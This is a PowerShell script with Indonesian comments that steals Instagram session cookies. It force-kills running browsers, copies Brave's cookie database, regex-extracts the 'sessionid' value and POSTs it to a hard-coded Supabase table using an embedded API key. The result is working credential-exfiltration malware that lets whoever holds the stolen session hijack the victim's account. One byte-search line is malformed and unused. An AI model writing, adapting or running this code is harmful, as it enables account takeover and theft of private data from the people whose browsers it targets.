$SUPABASE_URL = "https://bsunzewnefxyamapczzw.supabase.co"
$SUPABASE_TABLE = "sessions" 
$SUPABASE_ENDPOINT = "$SUPABASE_URL/rest/v1/$SUPABASE_TABLE"

$SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJzdW56ZXduZWZ4eWFtYXBjenp3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODgxNjQ3MjQsImV4cCI6MjEwMzc0MDcyNH0.QzoTFIGOREcUXl6SfxvpxA61d53g0hTB9x8Dsbfthws"

function Kill-BrowserProcesses {
    Write-Host "[*] Menghentikan seluruh proses browser dan service terkait..."
    $processNames = @(
        "brave", "chrome", "msedge", "opera", "vivaldi",
        "BraveUpdate", "GoogleUpdate", "edgeupdate",
        "crashpad_handler", "chrome_crashpad_handler"
    )
    foreach ($proc in $processNames) {
        Get-Process -Name $proc -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        Get-CimInstance Win32_Process -Filter "Name LIKE '%$proc%'" -ErrorAction SilentlyContinue | 
            Invoke-CimMethod -MethodName Terminate -ErrorAction SilentlyContinue | Out-Null
    }
    Start-Sleep -Seconds 3
}

function Save-To-Supabase {
    param ([string]$sessionId)
    if ([string]::IsNullOrWhiteSpace($sessionId)) {
        Write-Host "[!] Session ID kosong, tidak disimpan."
        return
    }
    try {
        Write-Host "[*] Mengirim Session ID ke Supabase..."
        $headers = @{
            "apikey"        = $SUPABASE_KEY
            "Authorization" = "Bearer $SUPABASE_KEY"
            "Content-Type"  = "application/json"
            "Prefer"        = "return=minimal"
        }
        $body = @{ "session" = $sessionId } | ConvertTo-Json
        $response = Invoke-RestMethod -Uri $SUPABASE_ENDPOINT -Method Post -Headers $headers -Body $body
        Write-Host "[✓] Berhasil menyimpan Session ID ke Supabase!"
    }
    catch {
        Write-Host "[!] Gagal menyimpan ke Supabase: $_"
    }
}

function Get-InstagramSession {
    Kill-BrowserProcesses

    # Path database cookie Brave
    $possiblePaths = @(
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Cookies",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 1\Network\Cookies",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 1\Cookies"
    )

    $dbPath = $null
    foreach ($path in $possiblePaths) {
        if (Test-Path $path) {
            $dbPath = $path
            break
        }
    }

    if (-not $dbPath) {
        Write-Host "[!] File database cookie Brave tidak ditemukan."
        return
    }

    $tempDb = "$env:TEMP\brave_cookies_temp.db"
    
    try {
        $sourceStream = New-Object System.IO.FileStream($dbPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
        $destStream = New-Object System.IO.FileStream($tempDb, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
        $sourceStream.CopyTo($destStream)
        $destStream.Close()
        $sourceStream.Close()
    }
    catch {
        Write-Host "[!] Gagal menyalin file database: $_"
        return
    }

    Write-Host "[*] Membaca database cookie Brave..."
    try {
        $bytes = [System.IO.File]::ReadAllBytes($tempDb)
        
        # KONVERSI STRING YANG LEBIH AMAN
        # Brave menggunakan UTF-16 LE atau UTF-8 untuk nama/value cookie.
        # Kita cari string "sessionid" dalam format UTF-8 dan UTF-16 LE untuk memastikan deteksi.
        
        # 1. Coba cari "sessionid" dalam UTF-8
        $utf8Bytes = [System.Text.Encoding]::UTF8.GetBytes("sessionid")
        $idxUtf8 = [System.Array]::FindIndex($bytes, { param($b) $b -eq $utf8Bytes[0] } | ForEach-Object { if ($bytes[$_..($_+$utf8Bytes.Length-1)] -join "," -eq $utf8Bytes -join ",") { return $_ } else { return -1 } })
        
        # Cara lebih sederhana dan robust: Gunakan [regex]::Matches pada string decoded
        # Decode seluruh file sebagai UTF-8 (kebanyakan browser modern)
        $textUtf8 = [System.Text.Encoding]::UTF8.GetString($bytes)
        
        # Regex untuk menangkap sessionid yang mungkin memiliki prefix domain atau path
        # Pola: "sessionid" diikuti oleh pemisah (spasi, \x00, atau karakter lain) lalu nilai
        $match = [regex]::Match($textUtf8, 'sessionid[^\w]*([^\s\x00\r\n\t]+)')
        
        if ($match.Success) {
            $sessionIdVal = $match.Groups[1].Value
            # Bersihkan karakter aneh yang mungkin masih tertangkap
            $sessionIdVal = $sessionIdVal -replace '[^\w%:-]', ''
            
            Write-Host ("=" * 65)
            Write-Host "INSTAGRAM SESSIONID BERHASIL DI-EKSTRAKSI:"
            Write-Host ("=" * 65)
            Write-Host $sessionIdVal
            Write-Host ("=" * 65)`n

            Save-To-Supabase -sessionId $sessionIdVal
        }
        else {
            # Coba lagi dengan UTF-16 LE jika UTF-8 gagal (beberapa browser lama)
            $textUtf16 = [System.Text.Encoding]::Unicode.GetString($bytes)
            $match16 = [regex]::Match($textUtf16, 'sessionid[^\w]*([^\s\x00\r\n\t]+)')
            if ($match16.Success) {
                $sessionIdVal = $match16.Groups[1].Value
                $sessionIdVal = $sessionIdVal -replace '[^\w%:-]', ''
                Write-Host ("=" * 65)
                Write-Host "INSTAGRAM SESSIONID BERHASIL DI-EKSTRAKSI (UTF-16):"
                Write-Host ("=" * 65)
                Write-Host $sessionIdVal
                Write-Host ("=" * 65)`n
                Save-To-Supabase -sessionId $sessionIdVal
            }
            else {
                Write-Host "`n[!] Cookie 'sessionid' Instagram tidak ditemukan."
                Write-Host "[!] Coba cek manual: Buka Brave -> DevTools (F12) -> Application -> Cookies -> instagram.com"
            }
        }
    }
    finally {
        if (Test-Path $tempDb) {
            Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
        }
    }
}

# Jalankan fungsi
Get-InstagramSession
